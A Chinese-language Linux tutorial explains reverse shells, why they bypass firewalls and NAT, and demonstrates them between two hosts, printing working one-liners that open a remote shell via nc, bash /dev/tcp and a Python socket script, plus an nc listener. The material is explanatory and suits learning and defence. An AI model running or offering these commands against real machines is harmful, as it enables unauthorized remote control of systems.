Linux
<a name="vl5vj"></a>
## 什么是反弹 Shell
都知道 Shell 的概念，简单来说，Shell 就是实现用户命令的接口，通过这个接口就能实现对计算机的控制，比如常见的 ssh 就是执行的 Shell 命令实现对远程对服务器的控制。<br />那反弹 Shell 是啥呢？其英文名叫做 Reverse Shell，具体干什么的呢？就是控制端首先监听某个 TCP/UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了。<br />比如说，有两台主机 A、B，最终想实现在 A 上控制 B。那么如果用正向 Shell，其实就是在 A 上输入 B 的连接地址，比如通过 ssh 连接到 B，连接成功之后，就可以在 A 上通过命令控制 B 了。如果用反向 Shell，那就是在 A 上先开启一个监听端口，然后让 B 去连接 A 的这个端口，连接成功之后，A 这边就能通过命令控制 B了。
<a name="eN7To"></a>
## 反弹 Shell 有什么用？
还是原来的例子，想用 A 来控制 B，如果想用 ssh 等命令来控制，那得输入 B 的 sshd 地址或者端口对吧？但是在很多情况下，由于防火墙、安全组、局域网、NAT 等原因，实际上是无法直接连接到 B 的，比如：

- A 虽然有公网 IP，但 B 是一个处于内网的机器，A 就没法直接连到 B 上。
- B 上开了防火墙或者安全组限制，sshd 的服务端口 22 被封闭了。
- B 是一台拨号主机，其 IP 地址经常变动。
- 假如 B 被攻击了，想让 B 向 A 汇报自己的状况，那自然就需要 B 主动去连接 A。

如果是这些情况，就可以用反弹 Shell 用 A 来控制 B 了。
<a name="WREHB"></a>
## 反弹 Shell 案例
首先看一个标准的反弹 Shell 的例子，这里一共需要两台主机：

- A 是控制端，可以处于公网之中，也可以和 B 处于一个局域网中，总之能让 B 找到 A 就行。
- B 是被控端，可以处在局域网之中。

在开始之前需要用到 nc 命令，安装非常简单。<br />如果是 CentOS 系列系统，安装命令如下：
```bash
# CentOS
yum install -y nc
```
如果是 Ubuntu 系列系统，安装命令可以参考 [https://stackoverflow.com/questions/10065993/how-to-switch-to-netcat-traditional-in-ubuntu](https://stackoverflow.com/questions/10065993/how-to-switch-to-netcat-traditional-in-ubuntu)。<br />接着，在 A 上执行如下命令：
```bash
nc -lvp 32767
```
这个命令的意思是开启 32767 的端口监听，运行之后如图所示：<br />![](https://cdn.nlark.com/yuque/0/2022/png/396745/1651580629613-4cd7c801-9cc4-4339-96e1-6d74eb5cbb7d.png#clientId=ua455d29e-7a81-4&from=paste&id=u941ab91b&originHeight=253&originWidth=1080&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u697d2800-1bd9-407d-b417-efe07ab254e&title=)<br />这样就表明 A 上正在监听 32767 端口的连接了。<br />这时候，可以在 B 上通过类似的命令连接到 A，假如 A 的 IP 是 111.112.113.114，那么命令如下：
```bash
nc 111.112.113.114 32767 -e /bin/bash
```
注意：在运行的时候需要替换成 A 的真实 IP 和端口。<br />运行完毕之后，反过来观察下 A，就显示了来自某个 IP 和端口的连接，就可以输入命令来控制 B 了，比如这里输入了：
```bash
uname -a
```
然后就可以得到 B 的主机名了。<br />如图所示：<br />![](https://cdn.nlark.com/yuque/0/2022/png/396745/1651580629638-7fbd72ef-b4f9-4a5c-9a4c-33a772c8317f.png#clientId=ua455d29e-7a81-4&from=paste&id=ue734b831&originHeight=208&originWidth=1080&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ue635e76a-42f4-4437-addf-2ecd9b90b16&title=)<br />这样就通过 nc 包实现了反弹 Shell。<br />有人说，这 B 上一定需要安装 nc 这个包吗？其实不一定的，可以直接使用 bash 来实现反弹 Shell，命令如下：
```bash
bash -i >& /dev/tcp/111.112.113.114/32767 0>&1
```
这个命令大致解释下：

- `bash -i` 就是产生一个 bash 交互环境
- `>&`可以将 bash 交互环境的输入、输出、错误输出都输出到一个地方
- `/dev/tcp/111.112.113.114/32767` 其实指的就是目标主机的一个连接地址，因为 Linux 环境中所有内容的定义都是以文件的形式存在的，指定这个地址就是让主机和目标主机建立一个 TCP 连接。
- `0>&1`可以将标准输入和标准输出相结合，重定向给前面标准输出的内容。

通过这样的命令，就可以就是将 B的标准输出和错误输出都重定向给 A，并且将 A 的输入都重定向给 B，这样就可以实现 A 对 B 的远程控制了，如图所示：<br />![](https://cdn.nlark.com/yuque/0/2022/png/396745/1651580629710-dbd9be68-bebf-49bd-af6b-ad67b514f151.png#clientId=ua455d29e-7a81-4&from=paste&id=u755795df&originHeight=242&originWidth=717&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u636e730e-0326-4721-80be-06aae52a55c&title=)<br />比如这样就可以轻松在 A 主机上拿到 B 主机的主机名、当前所处路径等内容了。<br />另外除了用 bash，还可以利用 Python 进行反弹 Shell，脚本如下：
```python
python -c 'import socket,subprocess,os; \
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("111.112.113.114",32767));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```
可以达到同样反弹 Shell 的效果，即可以用 A 来控制 B。
